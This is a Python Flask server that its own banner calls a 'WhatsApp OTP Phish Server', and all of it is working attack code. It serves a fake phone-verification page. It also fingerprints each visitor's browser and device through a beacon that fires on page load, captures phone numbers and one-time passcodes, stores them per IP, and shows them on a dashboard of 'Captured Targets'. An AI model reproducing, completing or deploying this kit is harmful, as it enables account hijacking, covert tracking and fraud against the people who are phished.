from flask import Flask, request, render_template, redirect, url_for, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)

LOG_FILE = "captured_data.log"
SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)


def get_real_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    if request.headers.get("X-Real-Ip"):
        return request.headers["X-Real-Ip"]
    return request.remote_addr


def log_data(category, data):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"\n{'='*60}\n[{ts}] [{category}]\n"
    for k, v in data.items():
        entry += f"  {k}: {v}\n"
    entry += f"{'='*60}\n"
    print(entry)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(entry)


def save_session(ip, data):
    safe = ip.replace(".", "_").replace(":", "_")
    path = os.path.join(SESSIONS_DIR, f"{safe}.json")
    existing = {}
    if os.path.exists(path):
        with open(path, "r") as f:
            existing = json.load(f)
    existing.update(data)
    existing["last_seen"] = datetime.now().isoformat()
    with open(path, "w") as f:
        json.dump(existing, f, indent=2)


# ─────────────── ROUTES ───────────────

@app.route("/")
def index():
    ip = get_real_ip()
    ua = request.headers.get("User-Agent", "Unknown")
    ref = request.headers.get("Referer", "Direct")
    lang = request.headers.get("Accept-Language", "Unknown")

    log_data("PAGE_VISIT", {
        "ip": ip, "user_agent": ua,
        "referrer": ref, "accept_language": lang
    })
    save_session(ip, {
        "ip": ip, "user_agent": ua,
        "first_visit": datetime.now().isoformat(), "referrer": ref
    })
    return render_template("index.html")


@app.route("/collect", methods=["POST"])
def collect_fingerprint():
    """JS fingerprint beacon — fires on page load even with zero interaction."""
    ip = get_real_ip()
    d = request.get_json(silent=True) or {}
    fp = {
        "ip": ip,
        "screen": f"{d.get('sw')}x{d.get('sh')}",
        "color_depth": d.get("cd"),
        "pixel_ratio": d.get("pr"),
        "timezone": d.get("tz"),
        "tz_offset": d.get("tzo"),
        "language": d.get("lang"),
        "languages": d.get("langs"),
        "platform": d.get("plat"),
        "cores": d.get("cores"),
        "ram_gb": d.get("ram"),
        "touch": d.get("touch"),
        "cookies_on": d.get("cookie"),
        "dnt": d.get("dnt"),
        "webgl_vendor": d.get("glV"),
        "webgl_renderer": d.get("glR"),
        "canvas_hash": d.get("cvs"),
        "plugins": d.get("plug"),
        "connection": d.get("conn"),
        "downlink_mbps": d.get("dl"),
        "battery": d.get("batt"),
        "charging": d.get("chrg"),
        "ua": d.get("ua"),
        "referrer": d.get("ref"),
        "webdriver": d.get("wd"),
    }
    log_data("FINGERPRINT", fp)
    save_session(ip, {"fingerprint": fp})
    return jsonify({"s": 1}), 200


@app.route("/verify", methods=["POST"])
def verify():
    ip = get_real_ip()
    cc = request.form.get("country_code", "").strip()
    phone = request.form.get("phone", "").strip()
    full = f"+{cc}{phone}"

    log_data("PHONE_CAPTURED", {
        "ip": ip, "country_code": cc,
        "phone": phone, "full_number": full
    })
    save_session(ip, {"phone": full, "phone_at": datetime.now().isoformat()})
    return render_template("verify_otp.html", phone=full)


@app.route("/verify-otp", methods=["POST"])
def verify_otp():
    ip = get_real_ip()
    otp = request.form.get("otp", "").strip()
    phone = request.form.get("phone", "").strip()

    log_data("OTP_CAPTURED", {
        "ip": ip, "phone": phone, "otp": otp
    })
    save_session(ip, {"otp": otp, "otp_at": datetime.now().isoformat()})
    return render_template("success.html")


@app.route("/dashboard")
def dashboard():
    sessions = []
    for fn in os.listdir(SESSIONS_DIR):
        if fn.endswith(".json"):
            with open(os.path.join(SESSIONS_DIR, fn)) as f:
                sessions.append(json.load(f))

    html = """<html><head><title>Dashboard</title>
    <style>
    body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px}
    table{border-collapse:collapse;width:100%}
    td,th{border:1px solid #0f0;padding:8px;text-align:left;font-size:13px}
    th{background:#1a1a1a}h1{color:#0f0;margin-bottom:15px}
    .tag{background:#003300;padding:2px 6px;border-radius:3px;margin:1px}
    </style></head><body>"""
    html += f"<h1>Captured Targets: {len(sessions)}</h1>"
    html += "<table><tr><th>IP</th><th>Phone</th><th>OTP</th>"
    html += "<th>Platform</th><th>Screen</th><th>Battery</th><th>Last Seen</th></tr>"

    for s in sessions:
        fp = s.get("fingerprint", {})
        html += f"""<tr>
            <td>{s.get('ip','?')}</td>
            <td>{s.get('phone','—')}</td>
            <td style='color:#ff0;font-weight:bold'>{s.get('otp','—')}</td>
            <td>{fp.get('platform','?')}</td>
            <td>{fp.get('screen','?')}</td>
            <td>{fp.get('battery','?')}</td>
            <td>{s.get('last_seen','?')}</td>
        </tr>"""
    html += "</table></body></html>"
    return html


# ─────────────── MAIN ───────────────

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════╗
║       WhatsApp OTP Phish Server — ACTIVE         ║
╠══════════════════════════════════════════════════╣
║  /             Phishing page (phone entry)       ║
║  /collect      Passive fingerprint beacon        ║
║  /verify       Captures phone number             ║
║  /verify-otp   Captures OTP code                 ║
║  /dashboard    View all captured sessions        ║
╠══════════════════════════════════════════════════╣
║  Logs     → captured_data.log                    ║
║  Sessions → sessions/                            ║
╚══════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=5000, debug=False)